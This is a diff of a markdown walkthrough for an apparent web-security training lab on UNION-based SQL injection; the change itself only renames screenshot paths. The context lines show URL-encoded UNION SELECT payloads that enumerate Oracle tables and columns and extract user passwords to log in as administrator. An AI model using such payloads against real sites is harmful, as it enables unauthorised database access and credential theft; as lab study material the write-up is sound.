@@ -18,7 +18,7 @@ step 1
 select any category then go to
 burpsuite => proxy => http history => click on =>`/filter?category=gifts` => send to repeater
 
-![screnshot](./images/lab10_repeater_category_gifts.png)
+![screnshot](images/lab10_repeater_category_gifts.jpg)
 
 step 2
 
@@ -35,7 +35,7 @@ convert to URL Encoded
 
 `/filter?category=Gifts'+UNION+SELECT+NULL,TABLE_NAME+FROM+all_tables--`
 
-![screnshot](./images/lab10_user_table.png)
+![screnshot](images/lab10_user_table.jpg)
 
 Table => `USERS_CACPFH`
 
@@ -55,7 +55,7 @@ convert to URL Encoded
 
 `/filter?category=Gifts'+UNION+SELECT+NULL,COLUMN_NAME+FROM+all_tab_columns+WHERE+table_name+%3d+'USERS_CACPFH'--`
 
-![screnshot](./images/lab10_user_id_password.png)
+![screnshot](images/lab10_user_id_password.jpg)
 
 Username => `USERNAME_WJPEXO`  Password => `PASSWORD_FJKSKF`
 
@@ -74,7 +74,7 @@ convert to URL Encoded
 
 `/filter?category=Gifts'+UNION+SELECT+USERNAME_WJPEXO,PASSWORD_FJKSKF+FROM+USERS_CACPFH--`
 
-![screnshot](./images/lab10_administraor_id_password.png)
+![screnshot](images/lab10_administraor_id_password.jpg)
 
 step 5
 
@@ -86,4 +86,4 @@ To solve the lab use administrator id and password
 </tr>
 ```
 
-![screnshot](./images/lab10_solved_lab.png)
+![screnshot](images/lab10_solved_lab.jpg)
